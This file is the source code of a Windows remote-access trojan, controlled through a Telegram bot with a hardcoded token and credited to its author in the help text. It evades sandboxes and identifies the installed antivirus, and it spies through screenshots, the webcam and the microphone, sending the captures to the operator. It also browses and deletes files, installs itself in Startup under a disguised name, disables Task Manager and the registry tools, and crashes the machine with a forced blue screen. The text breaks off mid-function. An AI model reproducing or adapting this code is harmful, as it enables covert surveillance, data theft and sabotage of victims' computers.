# -*- coding: utf8 -*-

import os
import sys
import cv2
import wave
import glob
import time
import shutil
import psutil
import telebot
import sqlite3
import pyaudio
import requests
import platform
import pyperclip
import webbrowser
import win32crypt
import json,base64
import urllib.request
from PIL import ImageGrab
from telebot import types
from telebot import util
from telebot import apihelper
from ctypes import *
from ctypes.wintypes import *
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from urllib.error import HTTPError
from win32gui import GetWindowText, GetForegroundWindow
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

#Прокси (Если не работает)
apihelper.proxy = {'http':'http://x.x.x.x:port'}

#Название файла при копировании в автозагрузку
fname = 'System32' + os.path.splitext(os.path.basename(sys.argv[0]))[1]

#Токен/Айди
token = '1890518768:AAEidn93bZoXoQOl6wJWawizl0iCZ4N3p2k'
adm = '870305559'

bot = telebot.TeleBot(token, threaded=True)
bot.worker_pool = util.ThreadPool(num_threads=30)

menu = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/1\n<<')
button2 = types.KeyboardButton('/2\n>>')
button3 = types.KeyboardButton('/Screen\n🖼')
button4 = types.KeyboardButton('/Webcam\n📸')
button5 = types.KeyboardButton('/WebcamVid\n🎥')
button6 = types.KeyboardButton('/Audio\n🎙')
button7 = types.KeyboardButton('/Power\n🔴')
button8 = types.KeyboardButton('/AutoRun\n🔵')
menu.row(button1, button3, button2)
menu.row(button4, button5, button6)
menu.row(button7, button8)

main2 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton("5 Секунд", callback_data='vid5')
button2 = types.InlineKeyboardButton("10 Секунд", callback_data='vid10')
button3 = types.InlineKeyboardButton("15 Секунд", callback_data='vid15')
button4 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main2.add(button1)
main2.add(button2)
main2.add(button3)
main2.add(button4)

main3 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton("5 Секунд", callback_data='audio5')
button2 = types.InlineKeyboardButton("10 Секунд", callback_data='audio10')
button3 = types.InlineKeyboardButton("15 Секунд", callback_data='audio15')
button4 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main3.add(button1)
main3.add(button2)
main3.add(button3)
main3.add(button4)

main4 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Выключить - ⛔️', callback_data='poweroff')
button2 = types.InlineKeyboardButton('Перезагрузить - ⭕️', callback_data='reboot')
button3 = types.InlineKeyboardButton('Синий экран смерти - 🌀', callback_data='bsod')
button4 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main4.row(button1)
main4.row(button2)
main4.row(button3)
main4.row(button4)

main5 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Сохранить - 📥', callback_data='startup')
button2 = types.InlineKeyboardButton('Удалить - ♻️', callback_data='uninstall')
button3 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main5.row(button1)
main5.row(button2)
main5.row(button3)

main6 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/3\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/4\n>>')
button4 = types.KeyboardButton('/Files\n💾')
button5 = types.KeyboardButton('/Tasklist\n📋')
button6 = types.KeyboardButton('/Taskkill\n📝')
main6.row(button1, button2, button3)
main6.row(button4)
main6.row(button5, button6)

main7 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/CD\n🗂')
button2 = types.KeyboardButton('/Upload\n📡')
button3 = types.KeyboardButton('/PWD\n📄')
button4 = types.KeyboardButton('/Remove\n🗑')
button5 = types.KeyboardButton('/Download\n📨')
button6 = types.KeyboardButton('/Run\n📌')
button7 = types.KeyboardButton('/Cancel')
main7.row(button1, button2, button3)
main7.row(button4, button5, button6)
main7.row(button7)

main8 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/5\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/6\n>>')
button4 = types.KeyboardButton('/Message\n💬')
button5 = types.KeyboardButton('/Voice\n📢')
button6 = types.KeyboardButton('/OpenURL\n🌐')
button7 = types.KeyboardButton('/Wallpapers\n🧩')
button8 = types.KeyboardButton('/OpenEXE\n⏱')
main8.row(button1, button2, button3)
main8.row(button4, button5)
main8.row(button6, button7, button8)

main9 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Открыть один раз - 🧨', callback_data='startfile')
button2 = types.InlineKeyboardButton('Открыть много раз - 💣', callback_data='infinityopen')
button3 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main9.row(button1)
main9.row(button2)
main9.row(button3)

main10 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Chrome - 🍥', callback_data='chrome')
button5 = types.InlineKeyboardButton('Explorer - 📂', callback_data='explorer')
button2 = types.InlineKeyboardButton('Paint - 🎨', callback_data='paint')
button3 = types.InlineKeyboardButton('CMD - ◼️', callback_data='cmd')
button4 = types.InlineKeyboardButton('« Назад', callback_data='back')
main10.row(button1)
main10.row(button5)
main10.row(button2)
main10.row(button3)
main10.row(button4)

main11 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Chrome - 🍥', callback_data='infchrome')
button5 = types.InlineKeyboardButton('Explorer - 📂', callback_data='infexplorer')
button2 = types.InlineKeyboardButton('Paint - 🎨', callback_data='infpaint')
button3 = types.InlineKeyboardButton('CMD - ◼️', callback_data='infcmd')
button4 = types.InlineKeyboardButton('« Назад', callback_data='back')
main11.row(button1)
main11.row(button5)
main11.row(button2)
main11.row(button3)
main11.row(button4)

main12 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Да, удалить', callback_data='confirm')
button2 = types.InlineKeyboardButton('Не удалять', callback_data='cancel')
button3 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main12.row(button1)
main12.row(button2)
main12.row(button3)

main13 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Остановить все процессы', callback_data='taskkill all')
button2 = types.InlineKeyboardButton('Отключить диспетчер задач', callback_data='disabletaskmgr')
main13.row(button1)
main13.row(button2)


for file in glob.glob('C:\\Users\\John\\Desktop\\foobar.*'):
   sys.exit()
for file in glob.glob('C:\\Users\\Peter Wilson\\Desktop\\Microsoft Word 2010.lnk'):
   sys.exit()


if os.path.exists('C:\\Program Files\\Windows Defender'):
   av = 'Windows Defender'
if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
   av = 'Avast'
if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
   av = 'AVG'
if os.path.exists('C:\\Program Files (x86)\\Avira\\Launcher'):
   av = 'Avira'
if os.path.exists('C:\\Program Files (x86)\\IObit\\Advanced SystemCare'):
   av = 'Advanced SystemCare'
if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
   av = 'Bitdefender'
if os.path.exists('C:\\Program Files\\DrWeb'):
   av = 'Dr.Web'
if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
   av = 'ESET'
if os.path.exists('C:\\Program Files (x86)\\Kaspersky Lab'):
   av = 'Kaspersky'
if os.path.exists('C:\\Program Files (x86)\\360\\Total Security'):
   av = '360 Total Security'
else:
   pass

while True:
 try:
  r = requests.get('http://ip.42.pl/raw')
  IP = r.text
  bot.send_message(adm, 
  '\n🟢 Online!'
  '\n' + '\nPC » ' + os.getlogin() + 
  '\nOS » ' + platform.system() + ' ' + platform.release() + 
  '\n'
  '\nAV » ' + av +
  '\n'
  '\nIP » ' + IP,
  reply_markup=menu)
  if os.path.exists('C:\\ProgramData\\Files'):
    pass
  else:
    os.makedirs('C:\\ProgramData\\Files')
    os.makedirs('C:\\ProgramData\\Files\\Documents')
    os.makedirs('C:\\ProgramData\\Files\\Photos')
 except:
   print('[-] › Нет подключения')
 else:
   print('[+] › Подключено')
   break

@bot.message_handler(commands=['Start', 'start', 'Help', 'help'])
def help(command):
 bot.send_chat_action(command.chat.id, 'typing')
 bot.send_message(command.chat.id,
  'ᅠᅠᅠᅠ  ⚙️ *Команды* ⚙️'
  '\n'
  '\n'
  '\n/Screen -  Скриншот экрана'
  '\n/Webcam - Фото с вебки'
  '\n/WebcamVid - Видео с вебки'
  '\n/Audio - Запись микрофона'
  '\n/Power - Управление питанием'
  '\n/AutoRun - Автозагрузка'
  '\n'
  '\n/Files - Файловый менеджер'
  '\n› /CD - Текущая директория'
  '\n› /Pwd - Список файлов'
  '\n› /Remove - Удалить файл'
  '\n› /Upload - Загрузить файл'
  '\n› /Download - Скачать файл'
  '\n› /Run - Запустить файл'
  '\n/Tasklist - Список процессов'
  '\n/Taskkill - Остановить процесс'
  '\n'
  '\n/Message - Отправить сообщение'
  '\n/Voice - Озвучить сообщение'
  '\n/OpenURL - Открыть ссылку'
  '\n/Wallpapers - Установить обои'
  '\n/OpenEXE - Запуск программ'
  '\n'
  '\n/Passwords - Получить пароли'
  '\n/Clipboard - Буфер обмена'
  '\n'
  '\n'
  '\n_Coded by Bainky_ | *@bainki* 👾', 
  reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(commands=['3', '6'])
def main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode="Markdown")
@bot.message_handler(commands=['2', '5'])
def main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main6, parse_mode="Markdown")
@bot.message_handler(commands=['4', '1'])
def main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode="Markdown")

@bot.message_handler(commands=['Screen', 'screen'])
def screen(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  screen = ImageGrab.grab()
  screen.save(os.getenv('ProgramData') + '\\Screenshot.jpg')
  screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
  bot.send_photo(command.chat.id, screen)
  screen.close()
  os.remove('C:\\ProgramData\\Screenshot.jpg')
 except:
  pass

@bot.message_handler(commands=['Webcam', 'webcam'])
def webcam(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  cap = cv2.VideoCapture(0)
  for i in range(30):
     cap.read()
  ret, frame = cap.read()
  cv2.imwrite('C:\\ProgramData\\Webcam.jpg', frame)   
  cap.release()
  webcam = open('C:\\ProgramData\\Webcam.jpg', 'rb')
  bot.send_photo(command.chat.id, webcam)
  webcam.close()
  os.remove('C:\\ProgramData\\Webcam.jpg')
 except:
 	bot.send_message(command.chat.id, '*Камера не найдена*', parse_mode="Markdown")

@bot.message_handler(commands=['WebcamVid', 'webcamvid'])
def webcam(command):
 bot.send_chat_action(command.chat.id, 'typing')
 bot.send_message(command.chat.id, '*Выберите длительность видео*', reply_markup=main2, parse_mode='Markdown')

@bot.message_handler(commands=['Audio', 'audio'])
def audio(command):
 bot.send_chat_action(command.chat.id, 'typing')
 bot.send_message(command.chat.id, '*Выберите длительность записи*', reply_markup=main3, parse_mode='Markdown')

@bot.message_handler(commands=['Power', 'power'])
def power(command):
 bot.send_chat_action(command.chat.id, 'typing')
 bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main4, parse_mode="Markdown")

@bot.message_handler(commands=['AutoRun', 'autorun'])
def autorun(command):
 bot.send_chat_action(command.chat.id, 'typing')
 bot.send_message(command.chat.id, '*Выберите действие*', reply_markup=main5, parse_mode="Markdown")

@bot.message_handler(commands=['OpenEXE', 'openexe'])
def openexe(command):
 bot.send_chat_action(command.chat.id, 'typing')
 bot.send_message(command.chat.id, '*Выберите параметр*', reply_markup=main9, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
 if call.message:
  if call.data == 'vid5':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
      bot.send_chat_action(call.message.chat.id, 'upload_video')
      capture_duration = 5
      cap = cv2.VideoCapture(0)
      fourcc = cv2.VideoWriter_fourcc(*'XVID')
      out = cv2.VideoWriter('C:\\ProgramData\\WebcamVid.mp4',fourcc, 20.0, (640,480))
      start_time = time.time()
      while( int(time.time() - start_time) < capture_duration ):
         ret, frame = cap.read()
         if ret==True:
             frame = cv2.flip(frame,1)
             out.write(frame)
         else:
             break
      cap.release()
      out.release()
      cv2.destroyAllWindows()
      webcamvid = open('C:\\ProgramData\\WebcamVid.mp4', 'rb')
      bot.send_animation(call.message.chat.id, webcamvid)
      webcamvid.close()
      os.remove('C:\\ProgramData\\WebcamVid.mp4')
    except:
	    bot.send_message(call.message.chat.id, '*Камера не найдена*', parse_mode="Markdown")


  if call.data == 'vid10':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
      bot.send_chat_action(call.message.chat.id, 'upload_video')
      capture_duration = 10
      cap = cv2.VideoCapture(0)
      fourcc = cv2.VideoWriter_fourcc(*'XVID')
      out = cv2.VideoWriter('C:\\ProgramData\\WebcamVid.mp4',fourcc, 20.0, (640,480))
      start_time = time.time()
      while( int(time.time() - start_time) < capture_duration ):
         ret, frame = cap.read()
         if ret==True:
             frame = cv2.flip(frame,1)
             out.write(frame)
         else:
             break
      cap.release()
      out.release()
      cv2.destroyAllWindows()
      webcamvid = open('C:\\ProgramData\\WebcamVid.mp4', 'rb')
      bot.send_animation(call.message.chat.id, webcamvid)
      webcamvid.close()
      os.remove('C:\\ProgramData\\WebcamVid.mp4')
    except:
	    bot.send_message(call.message.chat.id, '*Камера не найдена*', parse_mode="Markdown")

  if call.data == 'vid15':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
      bot.send_chat_action(call.message.chat.id, 'upload_video')
      capture_duration = 15
      cap = cv2.VideoCapture(0)
      fourcc = cv2.VideoWriter_fourcc(*'XVID')
      out = cv2.VideoWriter('C:\\ProgramData\\WebcamVid.mp4',fourcc, 20.0, (640,480))
      start_time = time.time()
      while( int(time.time() - start_time) < capture_duration ):
         ret, frame = cap.read()
         if ret==True:
             frame = cv2.flip(frame,1)
             out.write(frame)
         else:
             break
      cap.release()
      out.release()
      cv2.destroyAllWindows()
      webcamvid = open('C:\\ProgramData\\WebcamVid.mp4', 'rb')
      bot.send_animation(call.message.chat.id, webcamvid)
      webcamvid.close()
      os.remove('C:\\ProgramData\\WebcamVid.mp4')
    except:
	    bot.send_message(call.message.chat.id, '*Камера не найдена*', parse_mode="Markdown")


  if call.data == 'audio5':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
      bot.send_chat_action(call.message.chat.id, 'record_audio')
      CHUNK = 1024
      FORMAT = pyaudio.paInt16
      CHANNELS = 2
      RATE = 44100
      RECORD_SECONDS = 5
      WAVE_OUTPUT_FILENAME = 'C:\\ProgramData\\voice.wav'
      p = pyaudio.PyAudio()
      stream = p.open(format=FORMAT,
                     channels=CHANNELS,
                     rate=RATE,
                     input=True,
                     frames_per_buffer=CHUNK)
      frames = []
      for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
         data = stream.read(CHUNK)
         frames.append(data)
      stream.stop_stream()
      stream.close()
      p.terminate()
      wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
      wf.setnchannels(CHANNELS)
      wf.setsampwidth(p.get_sample_size(FORMAT))
      wf.setframerate(RATE)
      wf.writeframes(b''.join(frames))
      wf.close()
      voice = open('C:\\ProgramData\\voice.wav', 'rb')
      bot.send_voice(call.message.chat.id, voice)
      voice.close()
      os.remove('C:\\ProgramData\\voice.wav')
    except:
    	pass

  if call.data == 'audio10':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
      bot.send_chat_action(call.message.chat.id, 'record_audio')
      CHUNK = 1024
      FORMAT = pyaudio.paInt16
      CHANNELS = 2
      RATE = 44100
      RECORD_SECONDS = 10
      WAVE_OUTPUT_FILENAME = 'C:\\ProgramData\\voice.wav'
      p = pyaudio.PyAudio()
      stream = p.open(format=FORMAT,
                     channels=CHANNELS,
                     rate=RATE,
                     input=True,
                     frames_per_buffer=CHUNK)
      frames = []
      for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
         data = stream.read(CHUNK)
         frames.append(data)
      stream.stop_stream()
      stream.close()
      p.terminate()
      wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
      wf.setnchannels(CHANNELS)
      wf.setsampwidth(p.get_sample_size(FORMAT))
      wf.setframerate(RATE)
      wf.writeframes(b''.join(frames))
      wf.close()
      voice = open('C:\\ProgramData\\voice.wav', 'rb')
      bot.send_voice(call.message.chat.id, voice)
      voice.close()
      os.remove('C:\\ProgramData\\voice.wav')
    except:
    	pass

  if call.data == 'audio15':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Записываем...*', parse_mode="Markdown")
      bot.send_chat_action(call.message.chat.id, 'record_audio')
      CHUNK = 1024
      FORMAT = pyaudio.paInt16
      CHANNELS = 2
      RATE = 44100
      RECORD_SECONDS = 15
      WAVE_OUTPUT_FILENAME = 'C:\\ProgramData\\voice.wav'
      p = pyaudio.PyAudio()
      stream = p.open(format=FORMAT,
                     channels=CHANNELS,
                     rate=RATE,
                     input=True,
                     frames_per_buffer=CHUNK)
      frames = []
      for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
         data = stream.read(CHUNK)
         frames.append(data)
      stream.stop_stream()
      stream.close()
      p.terminate()
      wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
      wf.setnchannels(CHANNELS)
      wf.setsampwidth(p.get_sample_size(FORMAT))
      wf.setframerate(RATE)
      wf.writeframes(b''.join(frames))
      wf.close()
      voice = open('C:\\ProgramData\\voice.wav', 'rb')
      bot.send_voice(call.message.chat.id, voice)
      voice.close()
      os.remove('C:\\ProgramData\\voice.wav')
    except:
    	pass

  if call.data == 'poweroff':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Компьютер выключен!*', parse_mode="Markdown")
      os.system('shutdown -s /t 0 /f')
    except:
      pass

  if call.data == 'reboot':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Компьютер перезагружен!*', parse_mode="Markdown")
      os.system('shutdown -r /t 0 /f')
    except:
      pass

  if call.data == 'bsod':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*BSoD активирован!*', parse_mode="Markdown")
      tmp1 = c_bool()
      tmp2 = DWORD()
      ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
      ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
    except:
      pass

  if call.data == 'startup':
    try:
      path = 'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
      file = os.path.basename(sys.argv[0])
      if os.path.exists(path + fname):
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + fname + '* уже находится в автозагрузке!', parse_mode="Markdown")
        os.startfile(path + fname)
      else:
        shutil.copy2((sys.argv[0]), r'' + path)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + file + '* скопирован в автозагрузку!', parse_mode="Markdown")
        time.sleep(1)
        os.rename(path + os.path.basename(sys.argv[0]), path + fname)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + file + '* переименован в *' + fname + '*', parse_mode="Markdown")
        os.utime(path + fname,(1330712280, 1330712292))
        time.sleep(2)
        os.startfile(path + fname)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + fname + '* запущен из автозагрузки!', parse_mode="Markdown")
        time.sleep(2)
    except:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")

  if call.data == 'uninstall':
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Вы уверены?*', reply_markup=main12, parse_mode="Markdown")

  if call.data == 'confirm':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Завершаем текущий процесс...*', parse_mode="Markdown")
      time.sleep(2)
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*' + os.path.basename(sys.argv[0]) + '* удален!', parse_mode="Markdown")
      directory = 'C:\\ProgramData\\'
      with open(os.path.join(directory, 'uninstaller.bat'), 'w') as OPATH:
        OPATH.writelines(['taskkill /f /im "' + os.path.basename(sys.argv[0]) + '"\n', 
                          'timeout 1\n', 
                          'del /s /q "', sys.argv[0]])
      os.startfile('C:\\ProgramData\\uninstaller.bat')
    except:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Ошибка*', parse_mode="Markdown")

  if call.data == 'taskkill all':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Останавливаем...*', parse_mode="Markdown")
      directory = 'C:\\ProgramData\\'
      with open(os.path.join(directory, 'taskkill.bat'), 'w') as OPATH:
          OPATH.writelines(['if "%~1"=="" (set "x=%~f0"& start "" /min "%comspec%" /v/c "!x!" any_word & exit /b)\n', 
                            'taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + os.path.basename(sys.argv[0]) + '"'])
      os.startfile('C:\\ProgramData\\taskkill.bat')
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Все процессы остановлены!*', parse_mode="Markdown")
    except:
      pass

  if call.data == 'disabletaskmgr':
    try:
      directory = 'C:\\ProgramData\\'
      with open(os.path.join(directory, 'regedit.bat'), 'w') as OPATH:
          OPATH.writelines(['reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\n', 
                            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f\n',
                            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])
      os.startfile('C:\\ProgramData\\regedit.bat', 'runas')
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Диспетчер задач отключен!*', parse_mode="Markdown")
    except OSError:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Отказано в доступе*', parse_mode="Markdown")
    except:
      bot.send_message(command.chat.id, '*Ошибка*', parse_mode="Markdown")

  if call.data == 'startfile':
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Выберите программу*', reply_markup=main10, parse_mode="Markdown")

  if call.data == 'chrome':
    try:
      os.startfile('chrome.exe')
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Chrome открыт!*', parse_mode="Markdown")
    except:
      pass

  if call.data == 'explorer':
    try:
      os.startfile('explorer.exe')
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Explorer открыт!*', parse_mode="Markdown")
    except:
      pass

  if call.data == 'paint':
    try:
      os.startfile('mspaint.exe')
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Paint открыт!*', parse_mode="Markdown")
    except:
      pass

  if call.data == 'cmd':
    try:
      os.startfile('cmd.exe')
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*CMD открыт!*', parse_mode="Markdown")
    except:
      pass

  if call.data == 'infinityopen':
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Выберите программу*', reply_markup=main11, parse_mode="Markdown")

  if call.data == 'infchrome':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Chrome открыт!*', parse_mode="Markdown")
      while True:
        os.startfile('chrome.exe')
    except:
      pass

  if call.data == 'infexplorer':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Explorer открыт!*', parse_mode="Markdown")
      while True:
        os.startfile('explorer.exe')
    except:
      pass

  if call.data == 'infpaint':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Paint открыт!*', parse_mode="Markdown")
      while True:
        os.startfile('mspaint.exe')
    except:
      pass

  if call.data == 'infcmd':
    try:
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*CMD открыт!*', parse_mode="Markdown")
      while True:
        os.startfile('cmd.exe')
    except:
      pass

  if call.data == 'back':
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='*Выберите параметр*', reply_markup=main9, parse_mode="Markdown")

  if call.data == 'cancel':
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='`...`', parse_mode="Markdown")

@bot.message_handler(commands=['Files', 'files'])
def files(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode="Markdown")

@bot.message_handler(commands=['CD'])
def cd(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  os.chdir(user_msg.split("/CD ")[1])
  bot.send_message(message.chat.id, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(message.chat.id, '*Директория не найдена*', parse_mode="Markdown")
 except:
  bot.send_message(message.chat.id, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")

@bot.message_handler(commands=['cd'])
def cd(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  os.chdir(user_msg.split("/cd ")[1])
  bot.send_message(message.chat.id, '*Директория изменена*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(message.chat.id, '*Директория не найдена*', parse_mode="Markdown")
 except:
  bot.send_message(message.chat.id, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")

@bot.message_handler(commands=['Remove'])
def remove(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
  year,month,day,hour,minute,second=time.localtime(created)[:-3]
  def convert_bytes(num):
      for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
          if num < 1024.0:
              return "%3.1f %s" % (num, x)
          num /= 1024.0
  def file_size(file_path):
      if os.path.isfile(file_path):
          file_info = os.stat(file_path)
          return convert_bytes(file_info.st_size)
  bot.send_message(message.chat.id, 
    'Файл *' + user_msg.split("/Remove ")[1] + '* удален!' 
    '\n' 
    '\nСоздан » %02d/%02d/%d'%(day,month,year) +
    '\nРазмер » ' + file_size(os.getcwd() + '\\' + user_msg.split("/Remove ")[1]),
    parse_mode="Markdown")
  os.remove(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
 except:
  try:
    bot.send_chat_action(message.chat.id, 'typing')
    created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
    year,month,day,hour,minute,second=time.localtime(created)[:-3]
    folder = os.getcwd() + '\\' + user_msg.split("/Remove ")[1]
    folder_size = 0
    for (path, dirs, files) in os.walk(folder):
      for file in files:
        filename = os.path.join(path, file)
        folder_size += os.path.getsize(filename)
    files = folders = 0
    for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + user_msg.split("/Remove ")[1]):
        files += len(filenames)
        folders += len(dirnames)
    shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
    bot.send_message(message.chat.id, 
      'Папка *' + user_msg.split("/Remove ")[1] + '* удалена!'
      '\n'
      '\nСоздана » %02d/%02d/%d'%(day,month,year) +
      '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
      '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
      parse_mode="Markdown")
  except FileNotFoundError:
  	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except PermissionError:
  	bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
  except:
  	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Remove • /RemoveAll*', parse_mode="Markdown")

@bot.message_handler(commands=['remove'])
def remove(message):
 try:
  bot.send_chat_action(message.chat.id, 'typing')
  user_msg = "{0}".format(message.text)
  created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
  year,month,day,hour,minute,second=time.localtime(created)[:-3]
  def convert_bytes(num):
      for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
          if num < 1024.0:
              return "%3.1f %s" % (num, x)
          num /= 1024.0
  def file_size(file_path):
      if os.path.isfile(file_path):
          file_info = os.stat(file_path)
          return convert_bytes(file_info.st_size)
  bot.send_message(message.chat.id, 
    'Файл *' + user_msg.split("/remove ")[1] + '* удален!' 
    '\n' 
    '\nСоздан » %02d/%02d/%d'%(day,month,year) +
    '\nРазмер » ' + file_size(os.getcwd() + '\\' + user_msg.split("/remove ")[1]),
    parse_mode="Markdown")
  os.remove(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
 except:
  try:
    bot.send_chat_action(message.chat.id, 'typing')
    created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
    year,month,day,hour,minute,second=time.localtime(created)[:-3]
    folder = os.getcwd() + '\\' + user_msg.split("/remove ")[1]
    folder_size = 0
    for (path, dirs, files) in os.walk(folder):
      for file in files:
        filename = os.path.join(path, file)
        folder_size += os.path.getsize(filename)
    files = folders = 0
    for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + user_msg.split("/remove ")[1]):
        files += len(filenames)
        folders += len(dirnames)
